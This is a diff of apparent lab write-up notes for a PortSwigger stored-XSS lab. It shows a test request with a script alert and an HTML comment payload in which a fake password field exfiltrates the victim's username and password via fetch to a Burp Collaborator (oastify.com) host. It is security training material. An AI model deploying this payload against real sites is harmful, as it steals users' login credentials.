@@ -70,7 +70,7 @@ https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturi
  
  This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account. 
 
-1. check where for XSS:
+1. check for XSS:
 ```
 POST /post/comment HTTP/1.1
 
@@ -80,7 +80,7 @@ csrf=2hUq6dqUHYhlhDjySjZDKNgC7pxsM6bL&postId=6&comment=<script>alert('comment')<
 2. craft a payload - use website form to post a comment:
 '''htm
 <input name=username id=username>
-<input type=password name=password onchange="if(this.value.length)fetch('https://2wzsovviqnn4qmhxsg9s7dy7dyj17q.oastify.com',{
+<input type=password name=password onchange="if(this.value.length)fetch('https://collaborator.oastify.com',{
 method:'POST',
 mode: 'no-cors',
 body:username.value+':'+this.value
